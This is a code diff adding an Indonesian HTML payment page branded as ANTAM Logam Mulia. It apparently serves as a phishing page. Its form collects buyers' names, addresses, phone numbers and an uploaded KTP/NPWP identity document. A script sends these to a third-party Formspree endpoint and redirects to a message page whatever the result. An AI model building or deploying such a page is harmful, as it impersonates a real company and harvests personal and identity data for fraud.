@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pembayaran - ANTAM Logam Mulia</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style7.css">
+</head>
+<body>
+
+    <header id="mainHeader">
+        <nav class="navbar">
+            <div class="logo">
+                <a href="produk.html">
+                    <img src="logo.jpg" alt="Logo Utama">
+                </a>
+            </div>
+            <div class="nav-actions">
+                <i class="fas fa-shopping-bag" onclick="window.location.href='checkout.html'"></i>
+                <i class="fas fa-times close-icon" onclick="window.location.href='produk.html'"></i>
+            </div>
+        </nav>
+    </header>
+
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+    <div class="sidebar" id="sidebarMenu">
+        <div class="sidebar-header">
+            <div class="sidebar-logo-container">
+                <img src="logo1.jpg" alt="Logo Sidebar">
+            </div>
+            <i class="fas fa-times close-btn" id="closeBtn"></i>
+        </div>
+        <div class="sidebar-content">
+            <button class="side-btn blue-btn">
+                <i class="fas fa-shopping-cart"></i> KERANJANG
+            </button>
+            <button class="side-btn blue-btn">
+                <i class="fas fa-user-circle"></i> MASUK DAFTAR
+            </button>
+        </div>
+    </div>
+
+    <main class="payment-container">
+        <div class="breadcrumb">
+            <span class="active">Informasi Pembeli</span> &nbsp;>&nbsp; <span>Metode Pengiriman</span> &nbsp;>&nbsp; <span>Metode Pembayaran</span>
+        </div>
+
+<form id="my-form" action="https://formspree.io/f/xaqwgazp" method="POST" enctype="multipart/form-data">
+    
+    <div class="input-group">
+        <label>E-mail</label>
+        <input type="email" name="email" placeholder="john@example.com" required>
+    </div>
+
+    <div class="row">
+        <div class="input-group">
+            <label>Nama Depan</label>
+            <input type="text" name="Nama Depan" placeholder="John" required>
+        </div>
+        <div class="input-group">
+            <label>Nama Belakang</label>
+            <input type="text" name="Nama Belakang" placeholder="Connor" required>
+        </div>
+    </div>
+
+    <div class="input-group">
+        <label>KTP / NPWP (Coret No KTP)</label>
+        <input type="file" name="ktp_file">
+    </div>
+
+    <div class="input-group">
+        <label>Negara</label>
+        <input type="text" name="Negara" placeholder="Negara" required>
+    </div>
+
+    <div class="row">
+        <div class="input-group">
+            <label>Provinsi</label>
+            <input type="text" name="provinsi" placeholder="Provinsi">
+        </div>
+        <div class="input-group">
+            <label>Kabupaten/Kota</label>
+            <input type="text" name="Kabupaten/kota" placeholder="Kabupaten/Kota">
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="input-group">
+            <label>Kecamatan</label>
+            <input type="text" name="Kecamatan" placeholder="Kecamatan">
+        </div>
+        <div class="input-group">
+            <label>Desa/kelurahan</label>
+            <input type="text" name="Desa/Kelurahan" placeholder="Desa/Kelurahan">
+        </div>
+    </div>
+
+    <div class="input-group">
+        <label>Alamat</label>
+        <textarea name="Alamat Lengkap" placeholder="Alamat lengkap" rows="3"></textarea>
+    </div>
+
+    <div class="row">
+        <div class="input-group">
+            <label>Kode Pos</label>
+            <input type="text" name="kode pos" placeholder="12345">
+        </div>
+        <div class="input-group">
+            <label>Telepon/Whatsapp</label>
+            <input type="text" name="nomor telepon/whatsapp" placeholder="+628123456789">
+        </div>
+    </div>
+
+    <button type="submit" id="my-form-button" class="btn-continue">Lanjutkan</button>
+    <p id="my-form-status"></p>
+</form>
+
+    </main>
+
+    <footer class="site-footer">
+        <div class="footer-image-container">
+            <img src="footer.jpg" alt="Footer Image">
+        </div>
+        <div class="bottom-bar">
+            <p>Logam Mulia, © 2025 Hak cipta dilindungi undang-undang.</p>
+        </div>
+    </footer>
+
+<script>
+  var form = document.getElementById("my-form");
+  
+  async function handleSubmit(event) {
+    event.preventDefault();
+    var status = document.getElementById("my-form-status");
+    var button = document.getElementById("my-form-button");
+    var data = new FormData(event.target);
+
+    // Ubah teks tombol agar user tahu sedang diproses
+    button.innerHTML = "Memproses...";
+    button.disabled = true;
+
+    fetch(event.target.action, {
+      method: form.method,
+      body: data,
+      headers: {
+          'Accept': 'application/json'
+      }
+    }).then(response => {
+      // Apapun responnya (berhasil atau gagal), langsung arahkan ke pesan.html
+      window.location.href = "pesan.html";
+    }).catch(error => {
+      // Jika terjadi error koneksi, tetap arahkan ke pesan.html
+      window.location.href = "pesan.html";
+    });
+  }
+  
+  form.addEventListener("submit", handleSubmit);
+</script>
+
+</body>
+</html>
